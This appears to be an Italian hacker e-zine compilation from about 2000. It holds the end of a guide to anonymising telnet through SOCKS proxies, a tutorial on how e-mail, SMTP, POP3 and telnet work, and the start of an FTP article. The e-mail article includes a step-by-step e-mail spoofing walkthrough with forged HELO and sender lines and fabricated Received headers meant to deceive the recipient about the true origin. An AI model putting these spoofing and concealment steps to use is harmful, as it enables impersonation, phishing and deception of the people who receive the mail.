   sul bottone OK.

Per trovare i Firewall usate lo stesso metodo spiegato sopra per i
Firewall Socks.

 Anonimo con telnet
 ====================
Per ultimo vi spiegherò come rendersi anonimi con il client Telnet,
non usate il telnet di windows.
Se proprio avete scelto windows come sistema operativo usate CRT, che 
dal mio punto di vista è il migliore, appunto per questo vi spiegherò
come settarlo per non far comparire il vostro IP all'ADMIN di un
Server.

Seguite i seguenti passaggi per settare CRT:
1- Avviate il client CRT.
2- Nella finestra connect cliccate su Annulla.
3- Andate su global preference dal menù options.
4- Nella finestra Global Preference cliccate su Firewall.
5- Nel gruppo type selezionate SOCKS 4 o 5 dipende dal sock trovato.
6- Nella casella host name scrivere l'host del SOCKS.
7- Nella casella port inserire la porta usata da SOCKS di solito 1080.
8- Premere sul pulsante OK per confermare il tutto.
9- Cliccate su Connect dal menù file.
10- Nella finestra Connect selezionate Quick Connect.
11- Selezionate Connect via firewall.

Adesso siete pronti per collegarvi ai server in modo totalmente anonimo
ma mi raccomando prima di commettere qualche SCHIOCCHEZZA accertatevi
che il cervello sia in funzione e pensate a quello che può succedere.

- - Dedico questa guida al mio amico scomparso Tah
									By AsM


= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =


= *************************************************************************** =
= ============================= [ POSTA ELETTRONICA ] ======================= =
= *************************************************************************** =

Autore: Merlinus
Luglio 2000

GENERALITA'
===========
Sicuramente ognuno di voi ha scritto o ricevuto una e-mail (Elettronic Mail o meglio Posta 
elettronica); infatti è uno dei servizi di internet più diffusi. In questo articolo cominceremo
un viaggio nell'ambito dell' E-Mail appunto cercando di capire come effettivamente funziona e 
cosa ci permette di fare.
Il servizio di posta elettronica è una delle opportunità offerte da Internet e consiste nella 
spedizione e ricezione di messaggi di testo ai quali è possibile allegare anche file di ogni 
tipo (immagini, suoni, video) compatibilmente con le dimensioni del file stesso. La posta 
elettronica (come anche altri servizi di Internet) sfrutta per la trasmissione delle letterine
dei protocolli di "trasmissione" appunto...ma cosa sono veramente? Sicuramente Acido ne avrà
parlato ampiamente, io cercherò di rinfrescarvi la memoria. I protocolli, in genere, sono 
delle "regole" per fa si che due computer (anche diversi, cioè con hardware differente, 
software differente ecc.) possano comunicare tra loro in maniera corretta. Cercherò di farvi 
un esempio: se voi volete spedire una letterina, la scrivete, la imbustate, la affrancate, 
chiudete la busta, scrivete l'indirizzo del destinatario dietro ed il mittente avanti ed infine
la imbucate nelle cassettine apposite (famosissime cassettine rosse)...sono cioè tutte regole
che permettono la corretta spedizione di una lettera. Se voi non scrivete l'indirizzo o non 
seguite le regole suddette la letterina scritta con tanto amore non raggiungerà il destinatario.
Questo è un protocollo!! 
Bene, la posta elettronica utilizza come protocolli più frequenti (nel senso che ne esistono 
diversi), SMTP (Send Mail Transfer Protocoll) per la spedizione della e-mail dal mittente al 
destinatario, e POP3 (Post Office Protocoll) per scaricare l'email nel computer del destinatario.
Andiamo un po' più nei particolari: quando voi aprite il vostro client di posta elettronica 
(per client si intende programma di posta elettronica tipo outlook express, eudora, internet 
mail ecc.) scrivete l'e-mail e la spedite; in quel preciso momento il vostro client comunica 
mediante sessione Telnet (in seguito vi spiegherò cosa è...) con il vostro server (cioè il 
vostro provider di accesso ad Internet), in modo particolare con il servizio di spedizione di 
posta elettronica del vostro server che corrisponde alla porta 25 ed utilizza appunto il 
protocollo SMTP. Da qui, il vostro server comunicherà con il servizio di posta elettronica del
server destinatario (sempre alla porta 25). Quest'ultimo depositerà la letterina ricevuta 
nella directory del destinatario che fungerà da parcheggio temporaneo fino a quando il destinata
rio deciderà di collegarsi ad Internet e scaricare dal server nel suo computer, mediante il 
protocollo POP3, la famosa letterina. Tutte queste operazioni sono eseguite in maniera 
automatica e invisibile all'utente. Chiaro? Spero di si...Prima di proseguire vorrei 
descriversi brevemente come è strutturato un indirizzo di posta elettronica 

INDIRIZZI DI POSTA ELETTRONICA
===============================
Condizione indispensabile per lo scambio di un messaggio attraverso la posta elettronica è che
mittente e destinatario dispongano cioè di un proprio "indirizzo" (e-mail address).
L'indirizzo, solitamente, ci viene assegnato dal nostro fornitore di accesso ad Internet 
(provider appunto), ed è come una specie di casella postale (mailbox) ospitata dal computer
al quale "telefoniamo" al momento di collegarci ad Internet (server): in sostanza, uno 
spazio sul suo hard disk, nel quale i messaggi che ci sono inviati vengono depositati 
automaticamente.
Questo significa, fra l'altro, che non c'è bisogno che il nostro computer sia perennemente 
collegato ad Internet, in attesa dei messaggi che ci potrebbero arrivare: è il computer del 
provider che si assume questo onere per noi. Per quanto ci riguarda, quando decideremo di
collegarci controlleremo nella nostra casella postale se ci sono messaggi in attesa: in 
sostanza, il computer di chi ci fornisce l'accesso a Internet funziona un po' da segreteria 
telefonica, ricevendo per noi i messaggi che arrivano mentre non ci siamo (cioè mentre non 
siamo collegati), e informandocene alla prima occasione.
Vediamo come è strutturato un indirizzo di posta elettronica:

nome utente@dominio.dominio

La parte di indirizzo alla sinistra del simbolo @ (per gli amici "chiocciola" o "at") 
identifica l'utente in maniera univoca all'interno del sistema informatico che lo ospita 
(host system); spesso si tratterà del nostro cognome, o di un codice, o di un soprannome che
ci siamo scelti. L'importante è che non ci siano due utilizzatori di quel sistema con lo 
stesso identificativo. La parte di indirizzo a destra del simbolo @ identifica invece in 
maniera univoca, all'interno dell'intera rete Internet, il particolare sistema informatico 
presso il quale l'utente è ospitato, e corrisponde all'indirizzo simbolico dell'host. A sua 
volta l'host è composto dall'unione di dominii cioè:

pippo@tin.it

Questo indirizzo (come tutti gli indirizzi su internet) è univoco, cioè non esistono casi di 
omonimia su tutta la rete. Non c'è possibilità di errore. Solitamente quando diamo un indirizzo
e-mail (lo stesso vale per indirizzi web), esso viene scomposto in 3 parti; da destra verso
sinistra si riconoscono DOMINIO di I livello (.it), Dominio di II livello (tin) ed infine 
USERID prima della @ (pippo). Vediamoli in dettaglio. 
Premetto che questo argomento lo tratteremo in maniera più approfondita in un capitolo a 
parte. Adesso è mia premura solo accennarvi a queste cose in modo da introdurre e comprendere
meglio quello che dirò in seguito.
Il nome del dominio costituisce l'indirizzo univoco al quale rispondono tutti i servizi messi 
a disposizione su Internet da una azienda, o privato, o ente che ha registrato il nome stesso.
Il formato di nome di dominio è il seguente:

[nome registrato].[suffisso nazionale]. (es:tin.it)

Ad esempio, il nome di dominio tin.it indica un dominio privato chiamato tin, registrato 
all'interno del dominio nazionale Italia (it). Il dominio nazionale di un paese è 
rappresentato dal suo codice ISO a due lettere (.uk, .fr, .jp, it ecc.). In alcuni paesi ci 
sono ulteriori suddivisioni del dominio nazionale, tipicamente per distinguere utenza 
commerciale, accademica ed istituzionale. Ad esempio in alcuni domini registrati negli USA 
sono privi del suffisso nazionale .us;. fbi.gov sottintende fbi.gov.us. Esistono anche domini
multinazionali, quali: 
* .org (organizzazioni no profit), 
* .net (provider), 
* .com (aziende internazionali). 
* .mil (militari)
Il nome del dominio viene prefissato dal nome del servizio che si invoca, in modo da costituire
l'indirizzo Internet del servizio stesso; ad esempio, al nome www.tin.it risponde il server 
Web della Telecom Italia Net, al nome mail.tin.it corrisponde il servizio di posta in uscita, 
e così via. Quindi quando vogliamo mandare una email a pippo@tin.it il nostro server andrà 
alla ricerca del destinatario da destra verso sinistra: .it vuol dire che è italiano; tin.it è 
il dominio della telecom, in Italia appunto e quindi controllerà il nome dell'utente (pippo) 
all'interno del dominio tin.it
Facciamo un esempio: mettiamo il caso che pippo@tin.it voglia mandare una e-mail a 
topolino@libero.it 

Tenete presente una cosa: se inviamo una email da pippo@tin.it a topolino@libero.it il dominio
nazionale di appartenza di entrambi è lo stesso (.it appunto), quindi i due rispettivi server 
comunicano direttamente (questo avviene nella maggioranza dei casi; ci sono eccezioni di cui
parleremo in seguito). Se noi invece vogliamo inviare una email da pippo@tin.it a 
mickeymouse@aol.us , cioè da un dominio italiano a uno americano o comunque non .it, 
esisteranno dei server (uno o più di uno) che fungeranno da ponte tra mittente e destimatario
(cioè mail.tin.it ed mail.aol.us) di cui noi troveremo traccia negli headers del messaggio.

TELNET
======
Vi chiederete: cosa centra telnet con la posta elettronica? Centra, centra!! Adesso vi spiego
perché. Cosa è questo sconosciuto?. All'età della pietra, quando cioè i computer erano grossi
quanto una casa e costavano mooolto denaro, non esistevano i bei programmini di oggi; mi 
riferisco a client del tipo Outlook express, eudora (per la posta elettronica), Internet 
Explorer, Netscape Navigator (per la navigazione su Web), Cute ftp ecc. (per FTp), ecc. Tutte
queste operazioni venivano eseguite tramite TELNET (naturalmente mi riferisco ai sevizi attivi
a quell'epoca) che fungeva appunto da "tuttofare": permetteva di leggere e inviare email, 
di utilizzare l'ftp, di leggere pagine web testuali (anche se ancora non esistevano i siti 
che oggi conosciamo). Quando l'uso del computer si allargò ed entrarono nel mondo 
dell'informatica persone che di pc capivano meno di una sega, i programmatori hanno pensato: 
"Bè mi sa che per questi poveretti è un po' difficile usare telnet...inventiamo qualcosa di 
più semplice ed immediato" e voilà uscirono i primi software"user friendly" cioè alla portata
di tutti con le icone, i colori, le spiegazioni, ed il caffè! Ma telnet è rimasto ugualmente 
il client più potente proprio per questa capacità di poter fare tutto. Vediamo un po' più da 
vicino come funziona (di questo troverete un articolo dedicato scritto da Colla).
Telnet, come vi ho anticipato, è un traditore, nel senso che è multifaccia cioè può 
impersonificare un qualsiasi client, dal programma di posta elettronica al programma di 
navigazione di pagine Web, ftp e così via. Voi mi direte...e mo dove lo trovo sto coso? 
Niente paura giovani lo avete proprio sotto il naso: in Windows 95/98 lo trovate nella 
directory C:\WINDOWS, in Windows NT invece C:\WINNT\SYSTEM ( non cito Linux perché mi sembra
superfluo...:)). Adesso facciamolo funzionare:
Il modo più veloce è quello di andare in START - ESEGUI  e scriverci dentro "telnet" altrimenti
un modo più contorto è il seguente:
* Premete START - PROGRAMMI - PROMPT DI MSDOS.
* Vi troverete in C:\WINDOWS.
* Al prompt digitate TELNET e voilà comparirà la bella finestrella
 
Nel menu CONNETTI SISTEMA REMOTO sono presenti 3 opzioni che è necessario scegliere:
* Nome host: in questa finestrella bisogna dare l'indirizzo del computer a cui ci vogliamo 
  collegare sotto forma di IP (tipo 232.212.186.15) o sotto forma di host 
  (tipo www.vatteloapesca.com o a seconda del servizio al quale volete accedere tipo 
  mail.valleloapesca.com per la posta ecc).
* Porta: qui bisogna decidere la porta del server a cui ci dobbiamo collegare; la porta per 
  la posta in uscita è la 25 (utilizza appunto il protocollo SMTP), la posta da scaricare 
  utilizza invece la porta 110 (protocollo POP3), una sessione telnet si avvale della porta 23,
  ecc. di questo parleremo in un altro capitolo.
* Tipo terminale: qui si decide il modo di visualizzazione del terminale; il più usato oltre 
  che il migliore a mio giudizio è VT100.

Talvolta facendo una connesione può accadere che non riusciamo a vedere quello che scriviamo,
bene in questo caso è utile scegliere il menu TERMINALE e selezionare l'opzione ECO LOCALE; 
attenzione però, selezionando questa opzione talvolta nello scrivere le lettere potrebbero 
comparire a doppio ma ugualmente il server capirà cosa scriviamo. Un'altra raccomandazione: 
quando scriviamo in telnet, digitiamo le lettere lentamente in quanto non sarà possibile 
cancellare eventuali errori anche se provando la cancellazione sembra funzionare...occhio 
quindi! Naturalmente i client di telnet sono tantissimi e la modalità di connessione può 
variare, ma ricordatevi i principi sono uguali per tutti. Non ci credete che con telnet potete
inviare e scaricare email...seguitemi e vedrete!!! 
Per farvi capire la potenza di telnet vi faccio un esempio: mettiamo il caso che noi vogliamo 
inviare una e-mail a killer@freemail.it: secondo lo schema classico apriamo il client di posta,
scriviamo la lettera e nel momento in cui la inviamo, ci sarà la comunicazione con il nostro 
server di posta elettronica, sempre tramite sessione telnet alla porta 25 e da questo al server
freemail, al quale invierà la letterina...tutto in modo automatico. Adesso usiamo invece il 
metodo più spartano ma non per questo altrettanto valido: scriviamo una letterina con telnet. 
Mettiamo il caso che il mio indirizzo di posta elettronica sia: giocondo@tiscalinet.it e voglio
mandare una letterina a picazzo@tin.it ; bene rimbocchiamoci le mani e iniziamo.
Se siete utenti tiscali vi ricorderete che al momento della configurazione della vostra posta 
elettronica avete inserito come server in uscita smtp.tiscalinet.it e come server di posta in 
entrata pop.tiscalinet.it (di questo ne parleemo più avanti). Quindi il primo è il famoso 
server di cui vi ho parlato sopra quello cioè che il vostro client di posta elettronica 
contatta per inviare la letterina al destinatario. Questa volta però lo faremo manualmente 
cioè faremo a meno del nostro affezionato client.

1. Aprite telnet nel modo che vi ho detto.
2. Come sistema remoto inserite smtp.tiscalinet.it.
3. Come porta inserite la ....25 (bravi vi ricordate!).
4. Come terminale lasciate VT100.

Userò N per indicare quello scritto da noi e S la risposta del server, naturalmente voi non 
dovrete scriverli; inoltre  i miei commenti saranno inseriti tra le parentesi tonde in modo
da distingurli dai messaggi di connessione. Bene a questo se avete seguito tutto quello che
vi ho detto vi comparirà un messaggio di questo tipo: 

S: 220 tnv.phys.tue.nl ESMTP Sendmail 8.9.3 ready at Sat, 5 Aug 2000 21:28:42 +0200 (MET DST)
Bene il significato di questi messaggi ve li spiegherò più avanti.
N: helo giocondo 
S: 250 tnv.phys.tue.nl Hello [215.121.211.123], pleased to meet you
N: mail from: giocondo@tiscalinet.it (nostro indirizzo di posta elettronica)
S: 250 giocondo@tiscalinet.it... Sender ok
N: rcpt to: picazzo@tin.it (indirizzo del destinatario)
S: 250 picazzo@tin.it...Recipent ok
N: DATA
N: Received from me (per ora seguitemi passo passo poi vi spiegherò cosa scrivere per bene)
N: RIGA VUOTA
Caro Giovanni, la mamma ha detto di comprare 1/2 litro di latte e un grammo di hashish...mi 
raccomando di quello buono eheheh (Se non l'avete capito qui naturalmente dovrete scrivere 
il vostro messaggio...mi raccomando)
N: . (Normalissimo punto)
N: quit

Come avete visto abbiamo inviato una email usando esclusivamente telnet, senza cioè client 
specifici di posta elettronica. Non è finita qui ragazzuoli...adesso invece sempre usando 
telnet leggeremo la posta  direttamente dalla mail box del nostro provider senza scaricarla
nel nostro computer...difficile nooooo!! Prima però alcune precisazioni: come vi ho accennato
all'inizio di questo articolo esiste un protocollo per inviare email (SMTP appunto il cui 
server è alla porta 25) e un protocollo per scaricare la posta (POP3 che corrisponde invece 
alla porta 110). Se vi ricordate bene durante la configurazione del vostro account di posta 
avete inserito dei dati fornitivi dal provider - nella fattispecie di tiscali, 
smtp.tiscalinet.it e pop.tiscalinet.it - quest'ultimo rappresenta l'indirzzo a cui connettersi 
per leggere la nostra posta. Tenete a mente una cosa se in fase di invio di una lettera non 
c'è bisogno di password o cose del genere in caso di lettura di posta è necessaria la USERID 
di posta e la PASSWORD di posta (cose che avete definito in fase di attivazione di contratto 
con il vostro provider). Fatte queste premesse proviamo:

1. Apriamo telnet nel modo solito.
2. Come sistema remoto possiamo inserire pop.tiscalinet.it.
3. Come porta la 110.
4. Come tipo di terminale il solito vt100.

Se tutto è andato bene comparirà qualcosa del genere:

S: +OK InterMail POP3 server ready.
N: user giocondo (qui introdurre la userid di posta solitamente corrisponde alla parte del 
   vostro indirizzo email prima della @ ; tipo giocondo@tiscalinet.it sarà giocondo; 
   naturalmente le cose possono essere diverse).
S: +OK please send PASS command
N: pass trombata (qui va la vostra password naturalmente).
S: +OK giocondo is welcome here

A questo punto abbiamo alcuni comandi che possiamo usare:
* LIST che ci mostra le email che abbiamo nella nostra mailbox.
* RETR msg che ci permette di leggere l'email specificata in msg cioè dopo list comparirà una
  lista di letterina ognuna con un proprio numero. Se vogliamo leggere la letterina numero uno
  basta scrivere RETR 1.
* DELE msg ci permette di cancellare una letterina (tipo DELE 2). 

Ecco fatto abbiamo letto la nostra posta. Visto ragazzi facile no? Naturalmente queste cose 
le riprenderemo in seguito approfondendone i vari aspetti. Una cosa che voglio farvi notare 
per quanto riguarda la connessione al server POP è che qui leggete la posta senza scaricarla...
cioè rimane nella vostra mailbox...non vi viene in mente niente??? Bè anche in questo caso ne 
parleremo in seguito.
Andiamo avanti...
Vi ho mostrato come possiamo sostituirci al nostro client di posta ma che succederebbe se 
invece del nostro client (come vi ho mostrato), siamo noi ad aprire una sessione telnet con 
un server di posta qualsiasi alla porta 25, facendo finta di essere un normale programma di 
posta elettronica? Quest'ultimo crederà di avere davanti un normale client di posta elettronica
fidandosi, a maggior ragione se noi usiamo una sintassi di comunicazione corretta! 
Questa cosa ci apre le porta a qualcosa di veramente insolito...qualche idea...come dire 
malvagia...! Bè fatevele passare...questo cose possono essere illegali!!!
E proprio su questo principio che nascono le FAKE MAIL...tradotto letteralmente 
EMAIL FALSE...eheheheh già vedo brillare i vostri occhi...qualche scherzetto simpatico a 
qualche amico o nemico. Attenzione ragazzi le cose che sto per spiegarvi sono solo a scopo 
didattico...non le fate perché sono illegali. Mi dispiacerebbe dovervi portare le arancie e le 
sigarette in gattabuia....! E comunque se proprio non resistete, non mi ritenete responsabile 
delle vostre malefatte...eheheh.
 
FAKE MAIL
=========
ATTENZIONE: gli indirizzi qui riportati sono tutti non esistenti, questo per un discorso di 
correttezza nei confronti dei provider e anche perchè sono sicuro che se usassi alcuni veri, 
voi per provare li bombardereste di fake mails ...:).

Ahi ahi ahi, galeotti, già immagino la bava alla bocca nell'attesa delle informazioni sulle 
fake mail...calma, calma, vi accontento subito. Bene rimbocchiamoci le mani e andiamo avanti,
entriamo nel fantastico mondo di INTERNET. Come dicevo le fake mail sono email false (scusate
la ripetizione) cioè è possibile inviare una letterina nascondendo il nostro vero indirizzo 
e-mail o addirittura simulando che la letterina provenga da un'altra persona. Prima di tutto 
decidiamo il server a cui ci dobbiamo collegare e lo faremo tramite telnet; una piccola 
parentesi....ad ogni computer sulla rete corrisponde un unico indirizzo che potrà essere sotto
forma di Host (tipo www.unibo.it)o sotto forma di indirizzo IP (212.123.111.211). L'host name
è più una comodità che una necessità vera nel senso che è più facile ricordare www.unibo.it 
piuttosto che un indirizzo numerico IP. Quindi in telnet potete inserire l'uno o l'altro è 
uguale. Una piccola parentesi: se voi per esempio avete indirizzo e-mail del tipo 
gino@katazeb.it e volete spedire un messaggio ad un utente con indirizzo di posta elettronica
del tipo vittima@innocente.it potreste fare in due modi:

1- collegarsi al server della katazeb e li falsificare il messaggio (telnet: mail.katazeb.it 
porta 25)
2- collegarsi direttamente al server di innocente e fare li la stessa cosa 
(telnet: mail.innocente.it porta 25)

Esaminiamo le due possibilità.
Nel primo caso se voi utilizzate il server della katazeb collegandovi essendo abbonati al 
provider della katazeb (quindi con indirizzo IP assegnatovi da katazeb), potrete inviare email
anche falsificate. Altra possibilità è che voi abbiate sempre un abbonamento con katazeb e 
vogliate usare il server di posta in uscita di un altro provider (mail.instrada.it per esempio):
qui potreste avere qualche problemino perchè molti server infatti impediscono ad utenti non 
appartenenti al proprio dominio (es: instrada.it) di utilizzare il proprio server di posta in 
uscita per inviare messaggi esterni (tipo al server di innocente); questo è un sistema 
utilizzato sia per sicurezza sia, in modo particolare per evitare lo spamming (filtro 
anti-spamming infatti). 
La seconda opzione è senza dubbio la migliore, cioè collegarsi direttamente al server del 
destinatario (mail.innocente.it porta 25) in quanto non potrà impedirvi di accedere ai suoi 
servigi perchè si accorge che il destinatario del messaggio è un suo utente e quindi deve per 
forza consegnarli la letterina, da qualunque mittente esso arrivi. CHIARO, spero di si!!!!! 
Bene iniziamo la prima fakemail. Vi ricordo nuovamente che cose del genere sono ILLEGALI, 
quindi non fatele o se proprio volete, inviate a voi la letterina così potrete anche 
verificarne l'efficacia. Iniziamo: mettiamo il caso che vogliamo inviare una email fasulla 
a vittima@innocente.it e vogliamo fare in modo che il mittente sia viscido@killer.it 
(il nostro vero indirizzo giusto per essere coerenti con quanto detto sopra potrebbe essere
gino@katazeb.it) 

1.	Apriamo telnet ed inseriamo come server quello a cui appartiene il destinatario
      (esempio mail.innocente.it) e come porta inseriamo la 25
2.	Se il server da voi contattato avrà il servizio di posta elettronica vi uscirà il 
      seguente messaggio

S: 220-www.innocente.it Sendmail 8.6.12/8.6.9 ready at Sat, 21 May 2000 13:04:29 +0200 ESMTP
 spoken here

Alcune cose possono cambiare a seconda del server; questo dipende dal fatto che esistono più 
programmi di gestione di posta in uscita, comunque ricordatevi che i principi sono gli stessi.
Vediamo cosa significa. Il numero 220 è un messaggio del server che indica che la connessione 
è andata a buon esito. www.innocente.it è il nome dell'host; ESMTP è il protocollo di gestione 
di posta elettronica ed il programma che gestisce il servizio è il SENDMAIL versione 
8.6.12/8.6.9 (questo numero è importante perché in base a questo riuscirete a capire eventuali
bugs della versione); segue la data e l'ora. Il messaggio READY ci indica che il server è 
pronto ad ascoltarci. Andiamo avanti salutando il server e presentandoci come persone educate.:)

N: HELO nome host 

Che cosa significa? HELO è un comando di saluto (Ciao!); NOME HOST è il nome dell'host che 
contatta il server destinatario. Se il messaggio fosse vero e ad inviarlo fossimo stati noi, 
utilizzando il nostro abbonamento (katazeb.it), ed il nostro programma preferito di posta 
elettronica, quest'ultimo aprendo una sessione telnet con il server destinatario avrebbe 
scritto, in maniera automatica:
N: HELO mail.katazeb.it	
Cioè il server di posta in uscita della katazeb avrebbe contattato il server del destinatario 
lo avrebbe salutato (come sono educati questi computer..eheheh) e si sarebbe presentato. 
Ma nel caso nostro non è cosi: innanzitutto siamo noi tramite telnet a contattare il server 
destinatario e poi non vogliamo far sapere chi siamo quindi come host name metteremo uno FALSO:

N: HELO mail.killer.it

Dove MAIL.KILLER.IT è l'indirizzo falso del server mittente. Una piccola riflessione: perchè 
abbiamo messo mail.killer.it e non semplicemente www.killer.it? Bè semplicemente perchè così 
negli headers del messaggio si farà intendere che mail.killer.it ha ricevuto il messaggio da
qualcun' altro quindi sembrerà più veritiero. A questo punto il server risponderà:

S: 250 www.innocente.it Hello [202.143.150.23], pleased to meet you

Che carinooooo!!! Spiego: 250 è il solito codice che ci fa capire che il server ha ricevuto 
i nostri comandi correttamente. HELLO è un saluto. 
[202.143.150.23] vuelà e questo cosa è? Hmmmm non mi convince sembra un indirizzo IP...di 
chi sarà mai? Vuoi vedere che....vuoi vedere che è il mio? AZZZZ è proprio il mio!!! Ebbene
si cari scagnozzi questo è il nostro indirizzo IP che il server non solo vede, ma registra
e custodisce gelosamente tra i suoi file logs. Azz e mò come si fa? Lo vedremo dopo, la
cosa importante da sapere è che qualunque connessione diretta voi facciate con un server 
il vostro indirizzo IP è registrato e quindi siete perfettamente rintracciabili e PUNIBILI. 
Quindi occhio! Per ultimo PLEASED TO MEET YOU che tradotto significa "è un piacere incontrarti".
...che carinoooooo! Ragioniamo un attimo: allora siamo collegati ad un server e al momento 
del saluto immettiamo un dato falso (mail.killer.it), quindi sembrerebbe che lo stiamo 
ingannando invece no per due motivi: a volte immettere un host falso può fottere il server
parzialmente ma altre volte no! Infatti server con programmi di ultima generazione controllano
l'host da voi immesso e se è falso vi bloccano. Comunque sia, anche se riusciamo ad ingannarlo
in prima battuta, successivamente siamo identificati dal nostro IP che rimane "agli atti" 
per usare un termine giuridico. Allora come facciamo? Il primo è quello di confondere il 
destinatario facendo pensare che il nostro IP sia quello di un server che ha solo ricevuto 
l'email da altri; altro sistema è quello di nascondere il nostro IP utilizzando wingates 
(ma questa è un'altra storia...ne parleremo più avanti). Continuamo:

N: MAIL FROM: viscido@killer.it

Naturalmente qui deve essere inserito l'indirizzo e-mail Falso o l'indirizzo della persona 
che vogliate far credere essere il mittente (povero sfigato). Ricordatevi inoltre che se 
l'host che abbiamo inserito all'inizio è stato KILLER.IT, anche l'inidirizzo email deve 
terminare con lo stesso host (viscido@killer.it appunto).La risposta del server, se tutto
è andato ok, sarà:

S: 250 sender Ok 

Proseguiamo

N: RCPT TO: vittima@innocente.it 

Come avrete capito qui si deve inserire il destinatario. Se il destinatario non è un utente 
di quel dominio (cioè ha un indirizzo del tipo vittima@jumdy.it) il server utilizzando filtri
anti-spamming potrebbe darvi un messaggio di errore e bloccarvi (550 Failure Reply o unknown
local user). Se tutto è ok comparirà il messaggio:

S: 250 recipent Ok

Bene adesso inizia il bello. Infatti con il prossimo comando potremo manipolare gli headers 
dell'email. Gli headers non sono altro che le intestazioni del messaggio contenenti mittente,
le varie tappe seguite dal messaggio prima di giungere a noi, ora, data, tipo di protocollo 
ecc. Quindi capite bene che riuscire a compilare questi dati in maniera corretta è fondamentale.
Un consiglio: durante questa fase digitate le parole lentamente perché se commettete un
errore (come vi ho già detto telnet non permette di eseguire correzioni) potreste 
compromettere il tutto. Digitiamo DATA e diamo INVIO

N: DATA

Quindi iniziamo la compilazione degli headers

N: Received: from infame.killer.it ([202.143.150.21]) by mail.killer.it 
       (InterMail vM.4.01.02.27  201-234-119-110)with SMTP (8.9.3/8.9.4)id <20000521201118 
       JJLM15434@mail.killer.it @ [202.143.150.21]>
       for <vittima@innocente.it>; Sun, 21 May 2000 22:30:19 +0200
       Message-ID: <20000521201118. JJLM15434@mail.killer.it>
       Date: Sun, 21 May 2000 22:10:18 +0200 (CEST)
       Subject: Questa è una fakemail
       From: viscido@killer.it
       To: vittima@innocente.it
       MIME-Version: 1.0
       Content-Type: multipart/mixed; boundary="0-1957747793-957723078=:16254"
       Content-Transfer-Encoding: 8bit

N: Riga vuota

N: Qui dovete scrivere il vostro messaggio

N: . (punto normale)
 
Quando ci inviano una letterina, questa contiene non solo il messaggio vero e proprio, ma 
anche gli headers. Questi non sono altro che le intestazioni di una emails, cioè indicano il 
mittente, i computer attraverso i quali l'email è passata per arrivare a noi, il destinatario,
la data e l'ora, l'oggetto del messaggio ecc. Per visualizzare gli headers basta cliccare con 
il tasto destro del mouse sull'email e scegliere proprietà; a questo punto si aprirà una 
finestrella e noi sceglieremo DETTAGLI. Eccoli qua gli headers.
Bene adesso analizziamo i dati immessi in precedenza dopo il comando DATA:

Received: from infame.killer.it ([202.143.150.21])

Indica che l'host infame.killer.it è l'host da cui è partito il messaggio (il colpevole 
quindi...? ). Se ben ricordate vi ho detto che il server ha registrato il nostro vero IP 
(202.143.150.23); noi che abbiamo fatto? Visto che non potevamo fottere il server abbiamo 
simulato che il nostro IP fosse solo quello di un server (mail.killer.it appunto) che 
innocentemente ha ricevuto il messaggio da infame.killer.it a cui corrisponde 
l'IP 202.143.150.21 ( IP inserito appositamente da noi, molto simile al nostro cambiando 
solo l' ultima cifra da 23 a 21; questo è stato fatto perché simuliamo che infame.killer.it 
è un "membro" appartenente al dominio killer.it). Spero riuscite a capire ragazzi, non è 
difficile è solo un po' incasinato...Un consiglio: tutto quello che scrivete, quando finisce 
la riga deve andare sotto a alla "v" di RECEIVED per renderla più reale.

by mail.killer.it (InterMail vM.4.01.02.27 17-219-119-110) with SMTP (8.9.3/8.9.4)

Bè, qui diciamo che il server di posta in uscita mail.killer.it cioè NOI, ha ricevuto 
innocentemente la letterina e utilizzando il programma di gestione posta in uscita 
(INTERMAIL ecc.) con protocollo SMTP (versione 8.9.3/8.9.3) l'ha spedita in maniera del 
tutto inconsapevole..eheheheh.

< id <20000521201118.DMRV1981. mail.killer.it @ [202.143.150.21]>
Codice identificativo usato dal programma di gestione di posta elettronica, può essere essere
uguale a MESSAGE ID o variare se si sono usati più server, comunque date un occhiata a email
ricevute e copiate..eheheh 

for <vittima@innocente.it>; Sun, 21 May 2000 20:11:19 +0200
Che dirvi...destinatario, data, ora.

Message-ID: <20000521201518. JJLM15434@mail.killer.it>
Codice identificativo del messaggio con data (anno 2000; mese 05; giorno 21; ora 20; minuti 15;
secondi 18). La seconda parte DMRV1981 identifica l'operazione svolta nell'invio di QUEL 
messaggio di posta...Comunque sia non vi imparanoiate su questi numeri: copiateli da qualche 
email o inventateli di sana pianta l'importante che dopo il numero mettiate alla fine 
@mail.killer.it cioè il falso server.

Date: Sun, 21 May 2000 22:10:18 +0200 (CEST)
Data e ora.

Subject: Questa è una fakemail
Oggetto del messaggio....quello che volete.

From: viscido@killer.it
Mittente falso.

To: vittima@innocente.it
Destinatario vero.

MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="0-1957747793-957723078=:16254"
Content-Transfer-Encoding: 8bit
Tutti fronzoli che servono a rendere l'email più verietiera, copiateli sani sani da una vostra
ricevuta. Comunque sono le modalità e i parametri con cui viene inviata l'email.

Riga vuota
Che serve a far capire che avete finito di scrivere gli headers
IL VOSTRO MESSAGGIO cioè il testo della vostra email

. Un punto normale
Abbiamo finito. Per chiudere la sessione telnet con il server digitate QUIT. 
Cavolo che fatica ragazzi, spero sia valsa la pena...meglio di così non posso...
Concludo qui questa prima parte con la raccomandazione di non fare cazzate...siete 
perfettamente rintracciabili quindi occhio. Un consiglio: per la compilazione degli headers 
date un occhiata ad email che avete ricevuto da amici, conoscenti ecc. e vedete come sono 
fatte le intestazioni. Così avrete sicuramente la situazione sotto controllo.
La prossima volta se mai ci sarà...terminerò questo argomento e vedremo come renderci 
invisibili o quasi. Concludo salutando tutti quelli che hanno preso parte a Security System
nella speranza di riuscire a continuare la nostra opera...rendere alla portata di tutti il 
mondo di internet...ce lo auguriamo.
Ultima cosa: se avete lamentele o avete notato errori vi sarei grato se me li facesse 
notare...sono sempre pronto ad imparare ma vi pregherei di farlo in maniera civile...thx...

FONTI CONSULTATE:
- Internet 2000 (manuale di Internet della Mondadori).
- SMTP e un pò di POP3 (articolo scritto da ][^XaBaRaS^][ a cui va un mio saluto...).

											By Merlinus

= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =


= *************************************************************************** =
= ============== [ Ftp: tutto quello che avreste voluto sapere] ============= =
= *************************************************************************** =

Autore : ][^XaBaRaS^][
Pensiero del giorno : Megan Gale grazie di esistere.

Per rispetto a molti guru dell'informatica che sono venuti prima di me (natural
mente io non faccio parte di questa categoria), darò loro omaggio "cercando"
di non usare uno stile prettamente PigPeNiano, che la Comunità Europea ha dovuto
proteggere con vincoli e regole sui CopyCredit di certe frasi :D ... insomma 
